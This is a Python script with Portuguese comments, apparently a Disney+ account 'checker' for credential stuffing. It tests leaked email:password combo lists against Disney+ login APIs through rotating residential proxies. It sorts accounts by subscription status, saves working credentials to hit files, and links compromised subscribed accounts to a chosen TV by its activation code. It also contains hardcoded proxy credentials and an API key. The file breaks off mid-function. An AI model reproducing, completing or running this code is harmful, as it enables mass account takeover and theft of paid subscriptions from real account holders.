"""
Disney+ — Checker Multi-Thread com Proxy Residencial + Ativação na TV
======================================================================
• Le combo da pasta combo/ (email:senha)
• 1 a 30 bots simultaneos (threads)
• Proxy residencial DataImpulse rotativo
• Output colorido no terminal:
    LIVE  -> verde   (tem assinatura ativa)
    FREE  -> amarelo (conta valida, sem assinatura)
    2FA   -> roxo    (conta com verificacao em 2 etapas)
    BAD   -> vermelho (credenciais invalidas)
• Ativação automática na TV via código de 8 dígitos
• Salva resultados em results/
"""

import json
import re
import os
import sys
import uuid
import threading
import time
import glob
import ctypes
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests

# PROXY RESIDENCIAL (DataImpulse)
PROXY_USER = os.environ.get("PROXY_USER", "d0282d505e94efb35346").strip()
PROXY_PASS = os.environ.get("PROXY_PASS", "45922528a7251544").strip()
PROXY_HOST = os.environ.get("PROXY_HOST", "gw.dataimpulse.com").strip()
PROXY_PORT = os.environ.get("PROXY_PORT", "823").strip()

PROXIES = {
    "http":  f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}",
    "https": f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}",
}

DISNEY_DIR  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "disney")
COMBO_DIR   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "combo")
RESULTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results")
FILE_ACTIVATED = os.path.join(RESULTS_DIR, "tv_ativadas.txt")
os.makedirs(DISNEY_DIR, exist_ok=True)
os.makedirs(COMBO_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

GRAPH_GQL_URL = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
PUBLIC_GQL    = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
TOKEN_URL     = "https://disney.api.edge.bamgrid.com/token"

SDK_CLIENT_ID = "disney-svod-3d9324fc"
SDK_VERSION   = "35.6"
SDK_PLATFORM  = "javascript/windows/chrome"
USER_AGENT    = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
FALLBACK_APIKEY = (
    "ZGlzbmV5JmJyb3dzZXImMS4wLjA"
    ".Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
)

# CORES ANSI
R    = "\033[91m"   # vermelho brilhante
Y    = "\033[93m"   # amarelo brilhante
P    = "\033[95m"   # roxo brilhante
G    = "\033[92m"   # verde brilhante
C    = "\033[96m"   # ciano brilhante
W    = "\033[97m"   # branco brilhante
DIM  = "\033[2m"    # dimmed
RS   = "\033[0m"    # reset
BOLD = "\033[1m"    # negrito
OR   = "\033[38;5;214m"  # laranja (cor do login nas imagens)

FLAG_MAP = {
    "US":"US","BR":"BR","GB":"GB","CA":"CA","AU":"AU",
    "DE":"DE","FR":"FR","ES":"ES","IT":"IT","MX":"MX",
    "AR":"AR","CO":"CO","CL":"CL","PT":"PT","NL":"NL",
    "JP":"JP","KR":"KR","IN":"IN","SE":"SE","NO":"NO",
    "DK":"DK","FI":"FI","BE":"BE","CH":"CH","AT":"AT",
    "PL":"PL","NZ":"NZ","SG":"SG","ZA":"ZA","IE":"IE",
    "HK":"HK","TR":"TR","RU":"RU","NG":"NG","EG":"EG",
    "PE":"PE","VE":"VE","EC":"EC","UY":"UY","PY":"PY",
}

EMOJI_FLAGS = {
    "US":"🇺🇸","BR":"🇧🇷","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺",
    "DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","MX":"🇲🇽",
    "AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","PT":"🇵🇹","NL":"🇳🇱",
    "JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","SE":"🇸🇪","NO":"🇳🇴",
    "DK":"🇩🇰","FI":"🇫🇮","BE":"🇧🇪","CH":"🇨🇭","AT":"🇦🇹",
    "PL":"🇵🇱","NZ":"🇳🇿","SG":"🇸🇬","ZA":"🇿🇦","IE":"🇮🇪",
    "HK":"🇭🇰","TR":"🇹🇷","RU":"🇷🇺","PE":"🇵🇪","VE":"🇻🇪",
}

def get_flag(code):
    if not code or code == "N/A":
        return "🌐"
    return EMOJI_FLAGS.get(code.upper(), f"[{code.upper()}]")

lock         = threading.Lock()
count_live   = 0
count_free   = 0
count_2fa    = 0
count_bad    = 0
count_error  = 0
count_total  = 0
count_done   = 0
count_tv_ok  = 0   # ativações na TV bem-sucedidas
count_tv_err = 0   # ativações na TV com falha

TV_LICENSE_PLATE = None   # código de 8 dígitos da TV (None = não ativar)

ts = datetime.now().strftime("%Y%m%d_%H%M%S")
FILE_LIVE       = os.path.join(RESULTS_DIR, f"live_{ts}.txt")
FILE_LIVE_CLEAN = os.path.join(RESULTS_DIR, f"live_clean_{ts}.txt")
FILE_FREE       = os.path.join(RESULTS_DIR, f"free_{ts}.txt")
FILE_2FA        = os.path.join(RESULTS_DIR, f"2fa_{ts}.txt")
FILE_BAD        = os.path.join(RESULTS_DIR, f"bad_{ts}.txt")
FILE_ERROR      = os.path.join(RESULTS_DIR, f"error_{ts}.txt")

EMAIL_PASS_PATTERN = re.compile(
    r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[:|;]\s*(\S+)'
)

def _write_result(filepath, line):
    with lock:
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(line + "\n")

REGISTER_DEVICE_MUTATION = (
    "mutation registerDevice($input:RegisterDeviceInput!)"
    "{registerDevice(registerDevice:$input){grant{grantType assertion}}}"
)

LOGIN_MUTATION = """
mutation login($input: LoginInput!) {
    login(login: $input) {
        actionGrant
        account {
            id
            activeProfile { id }
        }
        activeSession { isSubscriber }
    }
}
"""

SUBSCRIPTION_QUERY = """
query {
    me {
        account {
            id
            attributes {
                email emailVerified
                locations {
                    purchase { country source }
                    registration { geoIp { country } }
                }
            }
        }
        entitlements { tier isExtraMember }
        identity {
            id
            subscriber {
                subscriberStatus subscriptionAtRisk
                subscriptions {
                    id state partner isEntitled paymentProvider
                    product { id name bundle subscriptionPeriod }
                    term {
                        purchaseDate startDate expiryDate
                        nextRenewalDate isFreeTrial
                    }
                }
            }
        }
    }
}
"""

EXCHANGE_LICENSE_PLATE_MUTATION = """
mutation exchangeLicensePlateForOffDeviceGrant($input: ExchangeLicensePlateForOffDeviceGrantInput!) {
  exchangeLicensePlateForOffDeviceGrant(exchangeLicensePlateForOffDeviceGrant: $input) {
    offDeviceGrant
    additionalClaims {
      name
      value
    }
  }
}
"""

REDEEM_OFF_DEVICE_GRANT_MUTATION = """
mutation redeemOffDeviceGrant($input: RedeemOffDeviceGrantInput!) {
  redeemOffDeviceGrant(redeemOffDeviceGrant: $input) {
    accepted
  }
}
"""

def _headers(auth_token, form=False, account_id=None):
    h = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded" if form else "application/json",
        "x-bamsdk-client-id": SDK_CLIENT_ID,
        "x-bamsdk-version": SDK_VERSION,
        "x-bamsdk-platform": SDK_PLATFORM,
        "x-bamsdk-platform-id": "browser",
        "x-disney-identity-client-id": "DTCI-DISNEYPLUS.WEB",
        "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
        "user-agent": USER_AGENT,
        "origin": "https://www.disneyplus.com",
        "referer": "https://www.disneyplus.com/",
        "accept-language": "pt-BR,pt;q=0.7",
        "dnt": "1",
        "authorization": f"Bearer {auth_token}",
        "x-request-id": str(uuid.uuid4()),
    }
    if account_id:
        h["x-bamtech-account-id"] = str(account_id)
    return h

def _post(url, **kwargs):
    kwargs.setdefault("timeout", 25)
    kwargs.setdefault("proxies", PROXIES)
    return requests.post(url, **kwargs)

def _get(url, **kwargs):
    kwargs.setdefault("timeout", 15)
    kwargs.setdefault("proxies", PROXIES)
    return requests.get(url, **kwargs)

_apikey_cache = None
_apikey_lock  = threading.Lock()

def get_client_apikey():
    global _apikey_cache
    with _apikey_lock:
        if _apikey_cache:
            return _apikey_cache
        sdk_url = (
            f"https://client-sdk-configs.bamgrid.com/"
            f"bam-sdk/v7.0/{SDK_CLIENT_ID}/browser/"
            f"v{SDK_VERSION}/windows/chrome/prod.json"
        )
        try:
            r = _get(sdk_url, headers={"user-agent": USER_AGENT, "accept": "application/json"})
            if r.status_code == 200:
                cfg = r.json()
                key = (
                    cfg.get("clientApiKey") or cfg.get("client_api_key") or
                    cfg.get("apiKey") or
                    cfg.get("bam", {}).get("clientApiKey") or
                    cfg.get("auth", {}).get("clientApiKey")
                )
                if key:
                    _apikey_cache = key
                    return key
        except Exception:
            pass
        try:
            r = _get("https://www.disneyplus.com",
                     headers={"user-agent": USER_AGENT, "accept-language": "pt-BR,pt;q=0.7"})
            if r.status_code == 200:
                matches = re.findall(
                    r'["\']?(ZGlzbmV5[A-Za-z0-9+/=]{20,}\.[A-Za-z0-9_\-]{20,})["\']?',
                    r.text)
                for m in matches:
                    if len(m) < 200:
                        _apikey_cache = m
                        return m
        except Exception:
            pass
        _apikey_cache = FALLBACK_APIKEY
        return FALLBACK_APIKEY

def register_device(apikey):
    payload = {
        "query": REGISTER_DEVICE_MUTATION,
        "variables": {"input": {
            "deviceFamily": "browser",
            "applicationRuntime": "chrome",
            "deviceProfile": "windows",
            "deviceLanguage": "pt-BR",
            "attributes": {
                "osDeviceIds": [],
                "manufacturer": "microsoft",
                "model": None,
                "operatingSystem": "windows",
                "operatingSystemVersion": "10.0",
                "browserName": "chrome",
                "browserVersion": "124.0.0",
                "brand": "web",
            },
        }},
        "operationName": "registerDevice",
    }
    for attempt in range(3):
        try:
            r = _post(f"{GRAPH_GQL_URL}?op=registerDevice", headers=_headers(apikey), json=payload, timeout=20)
            if r.status_code in (200, 201):
                res = r.json()
                if "errors" not in res:
                    assertion = (res.get("data", {}).get("registerDevice", {})
                                   .get("grant", {}).get("assertion"))
                    if assertion:
                        return assertion
        except Exception:
            pass
        if attempt < 2:
            time.sleep(1)
    return None

def get_anon_token(assertion, apikey):
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0", "longitude": "0", "platform": "browser",
        "subject_token": assertion,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:device",
    }
    for attempt in range(3):
        try:
            r = _post(TOKEN_URL, headers=_headers(apikey, form=True), data=data, timeout=20)
            if r.status_code in (200, 201):
                j = r.json()
                token = j.get("access_token")
                refresh = j.get("refresh_token")
                if token:
                    return token, refresh
        except Exception:
            pass
        if attempt < 2:
            time.sleep(1)
    return None, None


_BAD_CODES = {
    "BAD_REQUEST", "INVALID_CREDENTIALS", "INVALID_PASSWORD",
    "INVALID_EMAIL", "ACCOUNT_NOT_FOUND", "USER_NOT_FOUND",
    "FORBIDDEN", "AUTHENTICATION_FAILED", "INCORRECT_PASSWORD",
    "NOTFOUND", "NOT_FOUND", "UNAUTHORIZED_ACCESS",
    "BAD_CREDENTIALS", "WRONG_PASSWORD",
    "ERROR_AUTHORIZATION_INVALID_CREDENTIALS",
    "ERROR_AUTHORIZATION_ACCOUNT_NOT_FOUND",
    "ERROR_AUTHORIZATION_INVALID_PASSWORD",
    "CREDENTIALS_INVALID", "PASSWORD_INVALID", "EMAIL_INVALID",
}
_BAD_MSGS = [
    "invalid", "incorrect", "wrong password", "no account",
    "not found", "bad credentials", "authentication failed",
    "does not exist", "email or password",
]
# Códigos explícitos de 2FA/MFA
_2FA_CODES = {
    "STEP_UP", "MFA", "TWO_FACTOR", "2FA", "OTP",
    "VERIFICATION_REQUIRED", "MULTIFACTOR",
}
_2FA_MSGS = [
    "step-up", "two-factor", "verification required",
    "mfa", "otp", "multi-factor",
]

def do_login(email, password, anon_token):
    payload = {
        "query": LOGIN_MUTATION,
        "variables": {"input": {"email": email, "password": password}},
        "operationName": "login",
    }
    for attempt in range(3):   # 3 retries em erro de rede/SSL de proxy
        try:
            r = _post(f"{PUBLIC_GQL}?op=login", headers=_headers(anon_token), json=payload)
            if r.status_code == 429:
                return ("RETRY_TOKEN", None, False, None, None, None)  # token queimado, precisa renovar
            if r.status_code in (401, 403):
                return ("RETRY_TOKEN", None, False, None, None, None)  # token expirou
            res = r.json()
            break
        except Exception:
            if attempt < 2:
                time.sleep(1)
                continue
            return ("ERR", None, False, None, None, None)
    else:
        return ("ERR", None, False, None, None, None)

    if "errors" in res:
        is_bad = False
        for err in res["errors"]:
            raw_code = (
                err.get("extensions", {}).get("code") or
                err.get("code", "") or
                err.get("extensions", {}).get("errorCode", "") or
                ""
            )
            code = str(raw_code).upper().replace("-", "_").replace(" ", "_").replace(".", "_")
            msg  = (err.get("message") or err.get("description", "") or "").lower()

            # Checa 2FA primeiro (prioridade)
            if any(k in code for k in _2FA_CODES):
                return ("2FA", None, False, None, None, None)
            if any(k in msg for k in _2FA_MSGS):
                return ("2FA", None, False, None, None, None)

            # Checa BAD credentials (senha/conta errada)
            if any(k in code for k in _BAD_CODES):
                is_bad = True
            elif any(k in msg for k in _BAD_MSGS):
                is_bad = True

        # Se chegou aqui sem 2FA e sem BAD explícito → ERR (não classifica como BAD)
        return ("BAD", None, False, None, None, None) if is_bad else ("ERR", None, False, None, None, None)

    login_data = res.get("data", {}).get("login", {}) or {}
    is_sub_flag = bool(login_data.get("activeSession", {}).get("isSubscriber", False))
    action_grant = login_data.get("actionGrant")
    account_id = login_data.get("account", {}).get("id")

    sdk = res.get("extensions", {}).get("sdk", {}).get("token") or {}
    auth_token = None
    user_refresh_token = None
    if isinstance(sdk, dict) and sdk.get("accessToken"):
        auth_token = sdk["accessToken"]
        user_refresh_token = sdk.get("refreshToken")
    else:
        if action_grant:
            auth_token = _exchange_action_grant(action_grant, anon_token)

    return ("OK", auth_token, is_sub_flag, action_grant, account_id, user_refresh_token)

def _exchange_action_grant(action_grant, anon_token):
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0", "longitude": "0", "platform": "browser",
        "subject_token": action_grant,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:authorization_code",
    }
    try:
        r = _post(TOKEN_URL, headers=_headers(anon_token, form=True), data=data)
        if r.status_code not in (200, 201):
            return None
        return r.json().get("access_token")
    except Exception:
        return None

def check_subscription(auth_token):
    """Busca dados de assinatura. Retorna dict com dados, ou None se falhar totalmente."""
    for attempt in range(3):
        try:
            r = _post(PUBLIC_GQL, headers=_headers(auth_token),
                      json={"query": SUBSCRIPTION_QUERY, "variables": {}})
            if r.status_code == 401:
                return None   # token inválido, não adianta tentar de novo
            if r.status_code != 200:
                if attempt < 2:
                    time.sleep(attempt + 1)
                    continue
                return None
            me = r.json().get("data", {}).get("me")
            if not me:
                if attempt < 2:
                    time.sleep(attempt + 1)
                    continue
                return None
            account      = me.get("account", {})
            identity     = me.get("identity", {})
            entitlements = me.get("entitlements", {})
            subscriber   = identity.get("subscriber", {})
            attrs        = account.get("attributes", {})
            locations    = attrs.get("locations", {})
            subs         = subscriber.get("subscriptions", [])
            pc = locations.get("purchase", {}).get("country", "N/A")
            rc = locations.get("registration", {}).get("geoIp", {}).get("country", "N/A")
            country = pc if pc and pc != "N/A" else rc
            return {
                "account_id":       account.get("id"),
                "email":            attrs.get("email", "N/A"),
                "emailVerified":    attrs.get("emailVerified", False),
                "country":          country,
                "subscriberStatus": subscriber.get("subscriberStatus", "N/A"),
                "tier":             entitlements.get("tier", "N/A"),
                "subscriptions":    subs,
            }
        except Exception:
            if attempt < 2:
                time.sleep(attempt + 1)
                continue
            return None
    return None


def exchange_tv_code(license_plate, anon_token):
    """
    1º Passo: Valida e troca o código de 8 dígitos da TV (licensePlate)
    pelo grant do dispositivo (offDeviceGrant) usando a sessão anônima.
    """
    payload = {
        "query": EXCHANGE_LICENSE_PLATE_MUTATION,
        "variables": {"input": {"licensePlate": str(license_plate).strip()}},
        "operationName": "exchangeLicensePlateForOffDeviceGrant",
    }
    endpoint = f"{PUBLIC_GQL}?op=exchangeLicensePlateForOffDeviceGrant"
    for attempt in range(2):
        try:
            r = _post(endpoint, headers=_headers(anon_token), json=payload, timeout=20)
            if r.status_code in (200, 201):
                res = r.json()
                errs = res.get("errors", [])
                if errs:
                    msgs = "; ".join(e.get("message", "?") for e in errs)
                    return False, msgs
                grant = (
                    res.get("data", {})
                       .get("exchangeLicensePlateForOffDeviceGrant") or {}
                )
                off_device_grant = grant.get("offDeviceGrant") if isinstance(grant, dict) else None
                if off_device_grant:
                    return True, off_device_grant
                return False, f"offDeviceGrant vazio: {grant}"
            elif r.status_code in (401, 403):
                return False, f"HTTP {r.status_code} token inválido"
            else:
                return False, f"HTTP {r.status_code}"
        except Exception as e:
            if attempt < 1:
                time.sleep(1)
            else:
                return False, f"EXCECAO: {e}"
    return False, "Sem resposta"


def redeem_tv_grant(action_grant, off_device_grant, auth_token, account_id, refresh_token):
    """
    2º Passo: Vincula a conta logada (actionGrant) ao dispositivo da TV (offDeviceGrant).
    É esta mutação que efetivamente ATIVA a TV na tela!
    """
    payload = {
        "query": REDEEM_OFF_DEVICE_GRANT_MUTATION,
        "variables": {
            "input": {
                "actionGrant": action_grant,
                "offDeviceGrant": off_device_grant,
                "offDeviceRedemptionFlow": "Login",
                "refreshToken": refresh_token,
            }
        },
        "operationName": "redeemOffDeviceGrant",
    }
    endpoint = f"{PUBLIC_GQL}?op=redeemOffDeviceGrant"
    hdrs = _headers(auth_token, account_id=account_id)
    for attempt in range(2):
        try:
            r = _post(endpoint, headers=hdrs, json=payload, timeout=20)
            if r.status_code in (200, 201):
                res = r.json()
                errs = res.get("errors", [])
                if errs:
                    msgs = "; ".join(e.get("message", "?") for e in errs)
                    return False, msgs
                accepted = (
                    res.get("data", {})
                       .get("redeemOffDeviceGrant", {})
                       .get("accepted")
                )
                if accepted:
                    return True, "OK"
                return False, f"accepted={accepted}"
            else:
                return False, f"HTTP {r.status_code}"
        except Exception as e:
            if attempt < 1:
                time.sleep(1)
            else:
                return False, f"EXCECAO: {e}"
    return False, "Sem resposta"


def activate_tv(license_plate, anon_token, action_grant, auth_token, account_id, refresh_token):
    """
    Executa o fluxo completo de ativação na TV:
    1. Troca o código da TV por offDeviceGrant
    2. Resgata e vincula na TV com a conta logada via redeemOffDeviceGrant
    """
    ok_ex, res_ex = exchange_tv_code(license_plate, anon_token)
    if not ok_ex:
        return False, f"Código TV: {res_ex}"
    return redeem_tv_grant(action_grant, res_ex, auth_token, account_id, refresh_token)

# ─── helpers de output ────────────────────────────────────────────────────────

def _build_plan(data):
    """Monta string do plano e retorna (plan_str, country, flag)."""
    subs    = data.get("subscriptions", [])
    country = data.get("country", "N/A")
    flag    = get_flag(country)
    plan    = "N/A"
    for sub in subs:
        name     = sub.get("product", {}).get("name", "")
        partner  = sub.get("partner")  or ""
        provider = sub.get("paymentProvider") or ""
        if name:
            parts = [name]
            if country and country != "N/A":
                parts.append(country)
            if str(partner)  not in ("None", "", "null"):
                parts.append(str(partner))
            if str(provider) not in ("None", "", "null"):
                parts.append(str(provider))
            plan = " - ".join(parts)
            break
    return plan, country, flag

def _print_live(email, password, data, done, total):
    plan, country, flag = _build_plan(data)
    HDR  = f"{G}\u2554" + "\u2550" * 10 + "[Disney+]"   + "\u2550" * 10 + f"\u2557{RS}"
    FTR  = f"{G}\u255a" + "\u2550" * 9  + "[@Masteron]" + "\u2550" * 9  + f"\u255d{RS}"
    PIPE = f"{G}\u2551{RS}"
    # Salva ANTES do lock para evitar deadlock (_write_result também usa lock)
    HDR_f = "\u2554" + "\u2550" * 10 + "[Disney+]"   + "\u2550" * 10 + "\u2557"
    FTR_f = "\u255a" + "\u2550" * 9  + "[@Masteron]" + "\u2550" * 9  + "\u255d"
    hit_block = (
        f"{HDR_f}\n"
        f"\u2551 Login:  {email}:{password}\n"
        f"\u2551 Plano:  {plan}\n"
        f"\u2551 Pais:   {country} {flag}\n"
        f"\u2551 Status: Ativo\n"
        f"{FTR_f}\n"
    )
    _write_result(FILE_LIVE, hit_block)
    _write_result(FILE_LIVE_CLEAN, f"{email}:{password} | Plano: {plan} | Pais: {country}")
    with lock:
        print(HDR)
        print(f"{PIPE} {W}Login:  {Y}{email}:{password}{RS}")
        print(f"{PIPE} {W}Plano:  {C}{plan}{RS}")
        print(f"{PIPE} {W}Pais:   {W}{country} {flag}{RS}")
        print(f"{PIPE} {W}Status: {G}Ativo{RS}")
        print(f"{FTR}  [{G}{done}{RS}/{total}]")


def _update_title():
    """Atualiza título do console sem usar os.system (evita crash com chars especiais)."""
    if sys.platform == "win32":
        try:
            title = (f"Disney+ Checker | LIVE:{count_live} FREE:{count_free} "
                     f"2FA:{count_2fa} BAD:{count_bad} | {count_done}/{count_total}")
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except Exception:
            pass

def process_account(line, apikey, thread_id):
    global count_live, count_free, count_2fa, count_bad, count_error, count_done
    line = line.strip()
    match = EMAIL_PASS_PATTERN.search(line)
    if not match:
        return
    email    = match.group(1).strip()
    password = match.group(2).strip()

    MAX_ATTEMPTS = 3
    status, auth_token, is_subscriber_login = None, None, False

    for attempt in range(1, MAX_ATTEMPTS + 1):
        # Token fresco a cada tentativa
        assertion = register_device(apikey)
        if not assertion:
            if attempt < MAX_ATTEMPTS:
                time.sleep(attempt)   # backoff: 1s, 2s
                continue
            # Esgotou tentativas sem conseguir token
            _write_result(FILE_ERROR, f"{email}:{password}")
            with lock:
                count_error += 1
                count_done  += 1
                _update_title()
            return

        anon_token, anon_refresh = get_anon_token(assertion, apikey)
        if not anon_token:
            if attempt < MAX_ATTEMPTS:
                time.sleep(attempt)
                continue
            _write_result(FILE_ERROR, f"{email}:{password}")
            with lock:
                count_error += 1
                count_done  += 1
                _update_title()
            return

        status, auth_token, is_subscriber_login, action_grant, account_id, user_refresh = do_login(email, password, anon_token)

        if status in ("BAD", "2FA", "OK"):
            break   # resultado definitivo, sai do loop

        # status == "ERR" ou "RETRY_TOKEN" — tenta de novo com novo token
        if attempt < MAX_ATTEMPTS:
            time.sleep(attempt)   # backoff progressivo
            continue
        # Esgotou — conta como erro
        _write_result(FILE_ERROR, f"{email}:{password}")
        with lock:
            count_error += 1
            count_done  += 1
            _update_title()
        return

    # ─── Processa o resultado definitivo ─────────────────────────────────────
    if status == "2FA":
        with lock:
            count_2fa += 1
            count_done += 1
            print(f"{P}[2FA]{RS} {W}{email}:{password} [{count_done}/{count_total}]{RS}")
            _update_title()
        _write_result(FILE_2FA, f"{email}:{password}")
        return

    if status == "BAD":
        with lock:
            count_bad += 1
            count_done += 1
            print(f"{R}[BAD]{RS} {W}{email}:{password} [{count_done}/{count_total}]{RS}")
            _update_title()
        _write_result(FILE_BAD, f"{email}:{password}")
        return

    if not auth_token and not is_subscriber_login:
        with lock:
            count_free += 1
            count_done += 1
            print(f"{Y}[SEM ASSINATURA]{RS} {W}{email}:{password} [{count_done}/{count_total}]{RS}")
            _update_title()
        _write_result(FILE_FREE, f"{email}:{password}")
        return

    # Busca assinatura com retry próprio
    data = check_subscription(auth_token)
    if data is None:
        if is_subscriber_login:
            data = {
                "account_id": account_id,
                "email": email,
                "emailVerified": True,
                "country": "N/A",
                "subscriberStatus": "SUBSCRIBER",
                "tier": "N/A",
                "subscriptions": [{"product": {"name": "Disney+ Active"}}],
            }
        else:
            _write_result(FILE_ERROR, f"{email}:{password}")
            with lock:
                count_error += 1
                count_done  += 1
                _update_title()
            return

    subs = data.get("subscriptions", [])
    tier = str(data.get("tier", "")).upper()

    def _is_active(s):
        if s.get("isEntitled") is True:
            return True
        state = str(s.get("state", "")).upper()
        return state in ("ACTIVE", "ATIVO", "ENTITLED", "ENABLED")

    has_sub = is_subscriber_login or (any(_is_active(s) for s in subs) if subs else False)

    if not has_sub:
        status_str = str(data.get("subscriberStatus", "")).upper()
        if status_str in ("ACTIVE", "SUBSCRIBER", "ENTITLED", "PAYING"):
            has_sub = True

    if not has_sub and tier and tier not in ("N/A", "", "NONE", "FREE"):
        has_sub = True

    if has_sub:
        with lock:
            count_live += 1
            count_done += 1
            done  = count_done
            total = count_total
            _update_title()
        _print_live(email, password, data, done, total)

        # ── Ativação na TV ────────────────────────────────────────────────
        if TV_LICENSE_PLATE and auth_token and action_grant:
            acc_id = account_id or (data.get("account_id") if data else None)
            ref_tok = user_refresh or anon_refresh
            ok, motivo = activate_tv(TV_LICENSE_PLATE, anon_token, action_grant, auth_token, acc_id, ref_tok)
            global count_tv_ok, count_tv_err
            with lock:
                if ok:
                    count_tv_ok += 1
                    print(
                        f"{G}[TV-OK]{RS} {W}Ativado na TV com: "
                        f"{Y}{email}:{password}{RS}"
                    )
                else:
                    count_tv_err += 1
                    print(
                        f"{R}[TV-ERR: {motivo}]{RS} {W}Falha: "
                        f"{Y}{email}:{password}{RS}"
                    )
        # ─────────────────────────────────────────────────────────────────
    else:
        with lock:
            count_free += 1
            count_done += 1
            print(f"{Y}[SEM ASSINATURA]{RS} {W}{email}:{password} [{count_done}/{count_total}]{RS}")
            _update_title()
        _write_result(FILE_FREE, f"{email}:{password}")




def get_used_emails():
    """Lê todas as contas que já foram ativadas com sucesso em alguma TV."""
    used = set()
    if os.path.exists(FILE_ACTIVATED):
        try:
            with open(FILE_ACTIVATED, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    m = EMAIL_PASS_PATTERN.search(line)
                    if m:
                        used.add(m.group(1).strip().lower())
        except Exception:
            pass
    return used


def load_combo():
    """
    Carrega contas prioritariamente da pasta disney/ (ou combo/)
    ignorando automaticamente contas que já ativaram alguma TV.
    """
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
    used_emails = get_used_emails()

    # Busca arquivos primeiro na pasta disney/, depois combo/ e na pasta do script
    files = (
        glob.glob(os.path.join(DISNEY_DIR, "*.txt")) +
        glob.glob(os.path.join(DISNEY_DIR, "*.csv")) +
        glob.glob(os.path.join(COMBO_DIR, "*.txt")) +
        glob.glob(os.path.join(COMBO_DIR, "*.csv")) +
        glob.glob(os.path.join(SCRIPT_DIR, "*.txt")) +
        glob.glob(os.path.join(SCRIPT_DIR, "*.csv"))
    )

    seen_paths = set()
    unique_files = []
    # Ordena pelos mais recentes primeiro
    for f in sorted(files, key=os.path.getmtime, reverse=True):
        norm = os.path.normcase(os.path.abspath(f))
        if norm not in seen_paths and not norm.endswith(".py") and "tv_ativadas" not in norm:
            seen_paths.add(norm)
            unique_files.append(f)

    if not unique_files:
        print(f"{R}[!] Nenhum arquivo de contas encontrado na pasta disney/ ou combo/.{RS}")
        print(f"{Y}    Coloque o arquivo combo.txt na pasta disney/ com contas email:senha.{RS}")
        return []

    # Carrega automaticamente as contas válidas, excluindo as já usadas
    seen_emails = set()
    unique_accounts = []
    ignored_used_count = 0
    loaded_files = []

    for f in unique_files:
        file_count = 0
        with open(f, "r", encoding="utf-8", errors="ignore") as fh:
            for l in fh:
                m = EMAIL_PASS_PATTERN.search(l)
                if m:
                    email = m.group(1).strip()
                    pwd   = m.group(2).strip()
                    email_low = email.lower()
                    if email_low in used_emails:
                        ignored_used_count += 1
                        continue
                    if email_low not in seen_emails:
                        seen_emails.add(email_low)
                        unique_accounts.append(f"{email}:{pwd}")
                        file_count += 1
        if file_count > 0:
            loaded_files.append(f"{os.path.basename(f)} ({file_count})")

    if ignored_used_count > 0:
        print(f"{Y}[*] {ignored_used_count} conta(s) já ativada(s) anteriormente foram ignoradas.{RS}")

    if not unique_accounts:
        print(f"{R}[!] Todas as contas disponíveis já foram usadas para ativar TVs.{RS}")
        print(f"{Y}    Adicione contas novas na pasta disney/combo.txt.{RS}")
        return []

    print(f"{G}[+] Contas disponíveis ({len(unique_accounts)}): {W}{', '.join(loaded_files)}{RS}")
    return unique_accounts


# --- Modo Ativar TV Direto ---

def activate_tv_direto(accounts, license_plate, apikey):
    """
    Modo direto: percorre as contas em sequência, faz login e ativa a TV.
    1º Valida o código da TV com sessão anônima (como no disneyplus.com/begin)
    2º Faz login da conta com assinatura ativa
    3º Faz o redeemOffDeviceGrant vinculando a TV à conta logada
    Para assim que a primeira ativação for bem-sucedida.
    """
    print(f"\n{C}[->] ATIVANDO TV | {len(accounts)} contas disponíveis | Código TV: {W}{license_plate}{RS}")

    # 1. Faz o exchange do código da TV UMA ÚNICA VEZ para obter o offDeviceGrant
    print(f"{DIM}[*] Conectando código {license_plate} na Disney...{RS}", end=" ", flush=True)
    assertion = register_device(apikey)
    anon_token, anon_refresh = get_anon_token(assertion, apikey) if assertion else (None, None)
    if not anon_token:
        print(f"{R}[FALHA AO CRIAR SESSÃO]{RS}\n")
        return False

    ok_ex, res_ex = exchange_tv_code(license_plate, anon_token)
    if not ok_ex:
        print(f"{R}[CÓDIGO INVÁLIDO/EXPIRADO]{RS}")
        print(f"{R}[!] A Disney retornou: {res_ex}{RS}")
        print(f"{Y}    Por favor, abra o app Disney+ na TV para obter um código novo.{RS}\n")
        return False

    off_device_grant = res_ex
    print(f"{G}[CÓDIGO VÁLIDO E RECONHECIDO!]{RS}\n")

    current_anon_token = anon_token
    current_anon_refresh = anon_refresh

    # 2. Percorre as contas até uma ativar a TV com sucesso
    for i, line in enumerate(accounts, 1):
        m = EMAIL_PASS_PATTERN.search(line)
        if not m:
            continue
        email    = m.group(1).strip()
        password = m.group(2).strip()

        print(f"{DIM}[{i}/{len(accounts)}] Testando: {email}{RS}", end=" ", flush=True)

        # Login com a sessão anônima
        status, auth_token, is_sub_flag, action_grant, account_id, user_refresh = do_login(
            email, password, current_anon_token
        )

        # Se o token anônimo expirou ou foi rate-limited, renova apenas a sessão anônima
        if status == "RETRY_TOKEN":
            ass = register_device(apikey)
